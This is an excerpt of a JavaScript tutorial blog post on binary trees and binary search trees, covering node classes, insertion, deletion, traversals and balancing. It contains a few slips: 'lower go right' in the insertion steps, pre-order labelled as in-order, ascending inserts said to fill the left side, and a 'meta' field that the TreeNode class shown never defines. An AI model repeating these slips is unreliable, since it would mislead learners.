<!-- { img http://www.csie.ntnu.edu.tw/~u91029/BinaryTree2.png full Binary Tree } -->
<!-- **Complete binary tree** is when all levels except the last one are filled with nodes. -->
<!-- You can also have a combination of full and complete binary trees: -->
<!-- { img https://gsourcecode.files.wordpress.com/2012/02/complete-full-trees1.png "Complete/Full binary tree" } -->
<p>Look at this examples:</p>
<img src="/images/full-complete-perfect-binary-tree.jpg" title="Full vs. Complete vs. Perfect Binary Tree">
<p>These properties are not always mutually exclusive. You can have more than one:</p>
<ul>
<li>A perfect tree is <strong>always</strong> complete and full.<ul>
<li>Perfect binary trees have precisely `2^k - 1` nodes, where <em><code>k</code></em> is the last level of the tree (starting with 1).</li>
</ul>
</li>
<li>A complete tree is <strong>not</strong> always <code>full</code>.<ul>
<li>Like in our ‚Äúcomplete‚Äù example, since it has a parent with only one child. If we remove the rightmost gray node, then we would have a <strong>complete</strong> and <strong>full</strong> tree but not perfect.</li>
</ul>
</li>
<li>A full tree is not always complete and perfect.</li>
</ul>
<!-- If each non-leaf node on a binary tree has two descendants then we say is a **complete tree** -->
<!-- { img https://www.cs.cmu.edu/~adamchik/15-121/lectures/Trees/pix/full_complete.bmp caption } -->
<h1 id="Binary-Search-Tree-BST">Binary Search Tree (BST)<a href="#Binary-Search-Tree-BST" class="headerlink" title="Binary Search Tree (BST)"></a></h1><p>Binary Search Trees or BST for short are a particular application of binary trees. BST has at most two nodes (like all binary trees). However, the values are in such a way that the left children value must be less than the parent and the right children is must be higher.</p>
<!-- ---BST vs non-BST--- -->
<p><strong>Duplicates:</strong> Some BST doesn‚Äôt allow duplicates while others add the duplicate as a right child. Other implementations might keep a count on a case of duplicates (we are going to do this one later).</p>
<p>Let‚Äôs implement a Binary Search Tree!</p>
<h2 id="BST-Implementation">BST Implementation<a href="#BST-Implementation" class="headerlink" title="BST Implementation"></a></h2><p>BST are very similar to our previous <a href="#Implementing-a-simple-tree-data-structure">implementation of a tree</a>. However, there are some differences:</p>
<ul>
<li>Nodes can have at most only two children: left and right.</li>
<li>Nodes values has to be ordered as <code>left &lt; parent &lt; right</code>.</li>
</ul>
<p>Here‚Äôs the tree node. Very similar to what we did before, but we added some handy getters and setters for left and right children. Notice that is also keeping a reference to the parent and we update it every time add children.</p>
<figure class="highlight js"><figcaption><span>TreeNode.js</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/src/data-structures/trees/tree-node.js" target="_blank" rel="noopener">Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line marked"><span class="keyword">const</span> LEFT = <span class="number">0</span>;</span><br><span class="line marked"><span class="keyword">const</span> RIGHT = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(value) &#123;</span><br><span class="line">    <span class="keyword">this</span>.value = value;</span><br><span class="line">    <span class="keyword">this</span>.descendents = [];</span><br><span class="line marked">    <span class="keyword">this</span>.parent = <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  get left() &#123;</span><br><span class="line marked">    <span class="keyword">return</span> <span class="keyword">this</span>.descendents[LEFT];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  set left(node) &#123;</span><br><span class="line marked">    <span class="keyword">this</span>.descendents[LEFT] = node;</span><br><span class="line">    <span class="keyword">if</span> (node) &#123;</span><br><span class="line marked">      node.parent = <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  get right() &#123;</span><br><span class="line marked">    <span class="keyword">return</span> <span class="keyword">this</span>.descendents[RIGHT];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  set right(node) &#123;</span><br><span class="line marked">    <span class="keyword">this</span>.descendents[RIGHT] = node;</span><br><span class="line">    <span class="keyword">if</span> (node) &#123;</span><br><span class="line marked">      node.parent = <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Ok, so far we can add a left and right child. Now, let‚Äôs do the BST class that enforces the <code>left &lt; parent &lt; right</code> rule.</p>
<figure class="highlight js"><figcaption><span>BinarySearchTree.js linkUrl linkText</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BinarySearchTree</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>() &#123;</span><br><span class="line">    <span class="keyword">this</span>.root = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">this</span>.size = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  add(value) &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line">  find(value) &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line">  remove(value) &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line">  getMax() &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line">  getMin() &#123; <span class="comment">/* ... */</span> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Let‚Äôs implementing insertion.</p>
<h2 id="BST-Node-Insertion">BST Node Insertion<a href="#BST-Node-Insertion" class="headerlink" title="BST Node Insertion"></a></h2><p>To insert a node in a binary tree, we do the following:</p>
<ol>
<li>If a tree is empty, the first node becomes the <strong>root</strong> and you are done.</li>
<li>Compare root/parent‚Äôs value if it‚Äôs <em>higher</em> go <strong>right</strong>, if it‚Äôs <em>lower</em> go <strong>right</strong>. If it‚Äôs the same, then the value already exists so you can increase the duplicate count (multiplicity).</li>
<li>Repeat #2 until we found an empty slot to insert the new node.</li>
</ol>
<p>Let‚Äôs do an illustration how to insert 30, 40, 10, 15, 12, 50:
<img src="/images/bst2.gif" title="Inserting nodes on a Binary Search Tree (BST)"></p>
<p>We can implement insert as follows:</p>
<figure class="highlight js"><figcaption><span>BinarySearchTree.prototype.add</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/src/data-structures/trees/binary-search-tree.js#L11" target="_blank" rel="noopener">Full Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">add(value) &#123;</span><br><span class="line">  <span class="keyword">const</span> newNode = <span class="keyword">new</span> TreeNode(value);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">this</span>.root) &#123;</span><br><span class="line marked">    <span class="keyword">const</span> &#123; found, parent &#125; = <span class="keyword">this</span>.findNodeAndParent(value);</span><br><span class="line">    <span class="keyword">if</span> (found) &#123; <span class="comment">// duplicated: value already exist on the tree</span></span><br><span class="line marked">      found.meta.multiplicity = (found.meta.multiplicity || <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value &lt; parent.value) &#123;</span><br><span class="line">      parent.left = newNode;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      parent.right = newNode;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.root = newNode;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">this</span>.size += <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> newNode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>We are using a helper function called <code>findNodeAndParent</code>. If we found that the node already exists in the tree, then we increase the <code>multiplicity</code> counter. Let‚Äôs see how this function is implemented:</p>
<figure class="highlight js"><figcaption><span>BinarySearchTree.prototype.findNodeAndParent</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/src/data-structures/trees/binary-search-tree.js#L44" target="_blank" rel="noopener">Full Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">findNodeAndParent(value) &#123;</span><br><span class="line marked">  <span class="keyword">let</span> node = <span class="keyword">this</span>.root;</span><br><span class="line">  <span class="keyword">let</span> parent;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (node) &#123;</span><br><span class="line">    <span class="keyword">if</span> (node.value === value) &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    parent = node;</span><br><span class="line marked">    node = ( value &gt;= node.value) ? node.right : node.left;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">found</span>: node, parent &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>findNodeAndParent</code> goes through the tree searching for the value. It starts at the root (line 2) and then goes left or right based on the value (line 10). If the value already exists, it will return the node <code>found</code> and also the parent. In case that the node doesn‚Äôt exist, we still return the <code>parent</code>.</p>
<h2 id="BST-Node-Deletion">BST Node Deletion<a href="#BST-Node-Deletion" class="headerlink" title="BST Node Deletion"></a></h2><p>We know how to insert and search for value. Now, we are going to implement the delete operation. It‚Äôs a little trickier than inserting, so let‚Äôs explain it with the following cases:</p>
<p><strong>Deleting a leaf node (0 children)</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    30                             30</span><br><span class="line"> /     \         remove(12)     /     \</span><br><span class="line">10      40       ---------&gt;    10      40</span><br><span class="line">  \    /  \                      \    /  \</span><br><span class="line">  15  35   50                    15  35   50</span><br><span class="line">  /</span><br><span class="line">12*</span><br></pre></td></tr></table></figure>
<p>We just remove the reference from node‚Äôs parent (15) to be null.</p>
<p><strong>Deleting a node with one child.</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    30                              30</span><br><span class="line"> /     \         remove(10)      /     \</span><br><span class="line">10*     40       ---------&gt;     15      40</span><br><span class="line">  \    /  \                            /  \</span><br><span class="line">  15  35   50                         35   50</span><br></pre></td></tr></table></figure>
<p>In this case, we go to the parent (30) and replace child (10), with a child‚Äôs child (15).</p>
<p><strong>Deleting a node with two children</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    30                              30</span><br><span class="line"> /     \         remove(40)      /     \</span><br><span class="line">15      40*      ---------&gt;     15      50</span><br><span class="line">       /  \                            /</span><br><span class="line">      35   50                         35</span><br></pre></td></tr></table></figure>
<p>We are removing node 40 that has 2 children (35 and 50). We replace the parent‚Äôs (30) child (40) with the child‚Äôs right child (50). Then we keep the left child (35) in the same place it was before, so we have to make it the left child of 50.</p>
<p>Another way to do it to remove node 40, is to move the left child (35) up and then keep the right child (50) where it was.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    30</span><br><span class="line"> /     \</span><br><span class="line">15      35</span><br><span class="line">          \</span><br><span class="line">           50</span><br></pre></td></tr></table></figure>
<p>Either way is ok as long as you keep the binary search tree property: <code>left &lt; parent &lt; right</code>.</p>
<p><strong>Deleting the root.</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   30*                            50</span><br><span class="line"> /     \       remove(30)      /     \</span><br><span class="line">15      50     ---------&gt;     15      35</span><br><span class="line">       /</span><br><span class="line">      35</span><br></pre></td></tr></table></figure>
<p>Deleting the root is very similar to deleting nodes with 0, 1, or 2 children that we discussed earlier. The only difference is that afterward, we need to update the reference of the root of the tree.</p>
<p>Here‚Äôs an animation of what we discussed.</p>
<img src="/images/bst-remove.gif" title="Removing a node with 0, 1, 2 children from a binary search tree">
<p>In the animation, it moves up the left child/subtree and keeps the right child/subtree in place.</p>
<p>Now that we have a good idea how it should work, let‚Äôs implement it:</p>
<figure class="highlight js"><figcaption><span>BinarySearchTree.prototype.remove</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/src/data-structures/trees/binary-search-tree.js#L89" target="_blank" rel="noopener">Full Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">remove(value) &#123;</span><br><span class="line">  <span class="keyword">const</span> nodeToRemove = <span class="keyword">this</span>.find(value);</span><br><span class="line marked">  <span class="keyword">if</span> (!nodeToRemove) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Combine left and right children into one subtree without nodeToRemove</span></span><br><span class="line marked">  <span class="keyword">const</span> nodeToRemoveChildren = <span class="keyword">this</span>.combineLeftIntoRightSubtree(nodeToRemove);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (nodeToRemove.meta.multiplicity &amp;&amp; nodeToRemove.meta.multiplicity &gt; <span class="number">1</span>) &#123;</span><br><span class="line">    nodeToRemove.meta.multiplicity -= <span class="number">1</span>; <span class="comment">// handle duplicated</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nodeToRemove === <span class="keyword">this</span>.root) &#123;</span><br><span class="line">    <span class="comment">// Replace (root) node to delete with the combined subtree.</span></span><br><span class="line marked">    <span class="keyword">this</span>.root = nodeToRemoveChildren;</span><br><span class="line">    <span class="keyword">this</span>.root.parent = <span class="literal">null</span>; <span class="comment">// clearing up old parent</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> side = nodeToRemove.isParentLeftChild ? <span class="string">'left'</span> : <span class="string">'right'</span>;</span><br><span class="line">    <span class="keyword">const</span> &#123; parent &#125; = nodeToRemove; <span class="comment">// get parent</span></span><br><span class="line">    <span class="comment">// Replace node to delete with the combined subtree.</span></span><br><span class="line marked">    parent[side] = nodeToRemoveChildren;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">this</span>.size -= <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Here are some highlights of the implementation:</p>
<ul>
<li>First, we search if the node exists. If it doesn‚Äôt, we return false and we are done!</li>
<li>If the node to remove exists, then combine left and right children into one subtree.</li>
<li>Replace node to delete with the combined subtree.</li>
</ul>
<p>The function that combines left into right subtree is the following:</p>
<figure class="highlight js"><figcaption><span>BinarySearchTree.prototype.combineLeftIntoRightSubtree</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/src/data-structures/trees/binary-search-tree.js#L89" target="_blank" rel="noopener">Full Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">combineLeftIntoRightSubtree(node) &#123;</span><br><span class="line">  <span class="keyword">if</span> (node.right) &#123;</span><br><span class="line marked">    <span class="keyword">const</span> leftmost = <span class="keyword">this</span>.getLeftmost(node.right);</span><br><span class="line">    leftmost.left = node.left;</span><br><span class="line">    <span class="keyword">return</span> node.right;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> node.left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>For instance, let‚Äôs say that we want to combine the following tree and we are about to delete node <code>30</code>. We would like to combine 30‚Äôs left subtree into the right one. The result is this:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   30*                             40</span><br><span class="line"> /     \                          /  \</span><br><span class="line">10      40    combine(30)       35   50</span><br><span class="line">  \    /  \   -----------&gt;      /</span><br><span class="line">  15  35   50                  10</span><br><span class="line">                                \</span><br><span class="line">                                 15</span><br></pre></td></tr></table></figure>
<p>Now, and if we make the new subtree the root, then node <code>30</code> is no more!</p>
<h1 id="Binary-Tree-Transversal">Binary Tree Transversal<a href="#Binary-Tree-Transversal" class="headerlink" title="Binary Tree Transversal"></a></h1><p>There are different ways of traversing a Binary Tree depending on the order that the nodes are visited: in-order, pre-order and post-order. Also, we can use the
<a href="/blog/2018/05/14/Data-Structures-for-Beginners-Graphs-Time-Complexity-tutorial/#Depth-first-search-DFS-Graph-search">DFS</a>
and
<a href="/blog/2018/05/14/Data-Structures-for-Beginners-Graphs-Time-Complexity-tutorial/#Breadth-frirst-search-BFS-Graph-search">BFS</a>
that we learned from the
<a href="/blog/2018/05/14/Data-Structures-for-Beginners-Graphs-Time-Complexity-tutorial/">graph post.</a>
Let‚Äôs go through each one.</p>
<p><strong>In-Order Traversal</strong></p>
<p>In-order traversal visit nodes on this order: left, parent, right.</p>
<figure class="highlight js"><figcaption><span>BinarySearchTree.prototype.inOrderTraversal</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/src/data-structures/trees/binary-search-tree.js" target="_blank" rel="noopener">Full Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* inOrderTraversal(node = <span class="keyword">this</span>.root) &#123;</span><br><span class="line">  <span class="keyword">if</span> (node.left) &#123; <span class="keyword">yield</span>* <span class="keyword">this</span>.inOrderTraversal(node.left); &#125;</span><br><span class="line">  <span class="keyword">yield</span> node;</span><br><span class="line">  <span class="keyword">if</span> (node.right) &#123; <span class="keyword">yield</span>* <span class="keyword">this</span>.inOrderTraversal(node.right); &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Let‚Äôs use this tree to make the example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">         10</span><br><span class="line">       /    \</span><br><span class="line">      5      30</span><br><span class="line">    /       /  \</span><br><span class="line">   4       15   40</span><br><span class="line"> /</span><br><span class="line">3</span><br></pre></td></tr></table></figure>
<p>In-order traversal would print out the following values: <code>3, 4, 5, 10, 15, 30, 40</code>. If the tree is a BST, then the values will be sorted in ascendent order as in our example.</p>
<p><strong>Post-Order Traversal</strong></p>
<p>Post-order traversal visit nodes on this order: left, right, parent.</p>
<figure class="highlight js"><figcaption><span>BinarySearchTree.prototype.postOrderTraversal</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/src/data-structures/trees/binary-search-tree.js" target="_blank" rel="noopener">Full Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* postOrderTraversal(node = <span class="keyword">this</span>.root) &#123;</span><br><span class="line">  <span class="keyword">if</span> (node.left) &#123; <span class="keyword">yield</span>* <span class="keyword">this</span>.postOrderTraversal(node.left); &#125;</span><br><span class="line">  <span class="keyword">if</span> (node.right) &#123; <span class="keyword">yield</span>* <span class="keyword">this</span>.postOrderTraversal(node.right); &#125;</span><br><span class="line">  <span class="keyword">yield</span> node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Post-order traversal would print out the following values: <code>3, 4, 5, 15, 40, 30, 10</code>.</p>
<p><strong>Pre-Order Traversal and DFS</strong></p>
<p>In-order traversal visit nodes on this order: parent, left, right.</p>
<figure class="highlight js"><figcaption><span>BinarySearchTree.prototype.preOrderTraversal</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/src/data-structures/trees/binary-search-tree.js" target="_blank" rel="noopener">Full Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* preOrderTraversal(node = <span class="keyword">this</span>.root) &#123;</span><br><span class="line">  <span class="keyword">yield</span> node;</span><br><span class="line">  <span class="keyword">if</span> (node.left) &#123; <span class="keyword">yield</span>* <span class="keyword">this</span>.preOrderTraversal(node.left); &#125;</span><br><span class="line">  <span class="keyword">if</span> (node.right) &#123; <span class="keyword">yield</span>* <span class="keyword">this</span>.preOrderTraversal(node.right); &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Pre-order traversal would print out the following values: <code>10, 5, 4, 3, 30, 15, 40</code>. This order of numbers is the same result that we would get if we run the Depth-First Search (DFS).</p>
<figure class="highlight js"><figcaption><span>BinarySearchTree.prototype.dfs</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/src/data-structures/trees/binary-search-tree.js" target="_blank" rel="noopener">Full Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">* dfs() &#123;</span><br><span class="line">  <span class="keyword">const</span> stack = <span class="keyword">new</span> Stack();</span><br><span class="line"></span><br><span class="line">  stack.add(<span class="keyword">this</span>.root);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (!stack.isEmpty()) &#123;</span><br><span class="line">    <span class="keyword">const</span> node = stack.remove();</span><br><span class="line">    <span class="keyword">yield</span> node;</span><br><span class="line">    <span class="comment">// reverse array, so left gets removed before right</span></span><br><span class="line">    node.descendents.reverse().forEach(<span class="function"><span class="params">child</span> =&gt;</span> stack.add(child));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>If you need a refresher on DFS, we covered in details on <a href="/blog/2018/05/14/Data-Structures-for-Beginners-Graphs-Time-Complexity-tutorial/#Depth-first-search-DFS-Graph-search">Graph post</a>.</p>
<p><strong>Breadth-First Search (BFS)</strong></p>
<p>Similar to DFS, we can implement a BFS by switching the <code>Stack</code> by a <code>Queue</code>:</p>
<figure class="highlight js"><figcaption><span>BinarySearchTree.prototype.bfs</span><a href="https://github.com/amejiarosario/algorithms.js/blob/master/src/data-structures/trees/binary-search-tree.js" target="_blank" rel="noopener">Full Code</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">* bfs() &#123;</span><br><span class="line">  <span class="keyword">const</span> queue = <span class="keyword">new</span> Queue();</span><br><span class="line"></span><br><span class="line">  queue.add(<span class="keyword">this</span>.root);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (!queue.isEmpty()) &#123;</span><br><span class="line">    <span class="keyword">const</span> node = queue.remove();</span><br><span class="line">    <span class="keyword">yield</span> node;</span><br><span class="line">    node.descendents.forEach(<span class="function"><span class="params">child</span> =&gt;</span> queue.add(child));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>The BFS order is: <code>10, 5, 30, 4, 15, 40, 3</code></p>
<h1 id="Balanced-vs-Non-balanced-Trees">Balanced vs. Non-balanced Trees<a href="#Balanced-vs-Non-balanced-Trees" class="headerlink" title="Balanced vs. Non-balanced Trees"></a></h1><p>So far, we have discussed how to <code>add</code>, <code>remove</code> and <code>find</code> elements. However, we haven‚Äôt talked about the run times. Let‚Äôs think about the worst-case scenarios.</p>
<p>Let‚Äôs say that we want to add numbers in ascending order.</p>
<img src="/images/bst-asc.gif" title="Inserting values in ascending order in a Binary Search Tree">
<p>We will end up with all the nodes on the left side! This unbalanced tree is no better than a LinkedList so finding an element would take <em>O(n)</em>. üò±</p>
<p>Looking for something in an unbalanced tree is like looking for a word in the dictionary page by page. When the tree is balanced, you can open the dictionary in the middle and from there you know if you have to go left or right depending on the alphabet and the word you are looking for.</p>
<p>We need to find a way to balance the tree!</p>
<p>If the tree was <strong>balanced</strong>, then we could find elements in <em>O(log n)</em> instead of going through each node. Let‚Äôs talk about what balanced tree means.</p>
<!-- { img http://www.stoimen.com/blog/wp-content/uploads/2012/07/3.-Balanced-vs.-Non-Balanced.png Balanced vs unbalanced Tree } -->
<img src="/images/balanced-vs-non-balanced-tree.jpg" title="Balanced vs unbalanced Tree">
<p>If we are searching for <code>7</code> in the non-balanced tree, we have to go from 1 to 7. However, in the balanced tree, we visit: <code>4</code>, <code>6</code>, and <code>7</code>. It gets even worse with larger trees. If you have one million nodes, searching for a non-existing element might require to visit all million while on a balanced tree it just requires 20 visits! That‚Äôs a huge difference!</p>
<p>We are going to solve this issue in the next post using self-balanced trees (AVL trees).</p>
<h1 id="Summary">Summary<a href="#Summary" class="headerlink" title="Summary"></a></h1><p>We have covered much ground for trees. Let‚Äôs sum it up with bullets:</p>
<ul>
<li>The tree is a data structure where a node has 0 or more descendants/children.</li>
<li>Tree nodes don‚Äôt have cycles (acyclic). If it has cycles it is a <a href="/blog/2018/05/14/Data-Structures-for-Beginners-Graphs-Time-Complexity-tutorial/">Graph data structure</a> instead.</li>
<li>Trees with 2 children or less are called: Binary Tree</li>
<li>When a Binary Tree is sorted in a way that the left value is less than the parent and the right children is higher, then and only then we have a <strong>Binary Search Tree</strong>.</li>
<li>You can visit a tree in a pre/post/in-order fashion.</li>
<li>An unbalanced has a time complexity of <em>O(n)</em>. ü§¶üèª‚Äç</li>
<li>A balanced has a time complexity of <em>O(log n)</em>. üéâ</li>
</ul>
<!-- Usage: -->
<!-- https://www.quora.com/What-is-the-real-life-application-of-tree-data-structures -->
<!-- http://www.stoimen.com/blog/2012/07/03/computer-algorithms-balancing-a-binary-search-tree/ -->
<!-- https://stackoverflow.com/questions/8015630/definition-of-a-balanced-tree -->
<!-- https://www.radford.edu/~itec324/2016fall-ibarland/Lectures/SList-BST-Composite/bst-summary.java -->
]]></content>
    
    <summary type="html">
    
      &lt;script type=&quot;text/javascript&quot; src=&quot;https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML&quot; async&gt;&lt;/script&gt;

&lt;p&gt;Tree data structures are the base for other data structure like Maps and Sets. Also, used on databases performed quick searches. The HTML DOM uses a tree data structure to represents the hierachy of elements. These are some to name a few. In this post, we are going to explore the different types of trees like a binary tree, binary search trees and how to implement them.&lt;/p&gt;
    
    </summary>
    
      <category term="Programming" scheme="https://adrianmejia.com/categories/Programming/"/>
    
      <category term="Data Structures and Algorithms (DSA)" scheme="https://adrianmejia.com/categories/Programming/Data-Structures-and-Algorithms-DSA/"/>
    
    
      <category term="big-o notation" scheme="https://adrianmejia.com/tags/big-o-notation/"/>
    
      <category term="algorithms" scheme="https://adrianmejia.com/tags/algorithms/"/>
    
      <category term="tutorial_algorithms" scheme="https://adrianmejia.com/tags/tutorial-algorithms/"/>
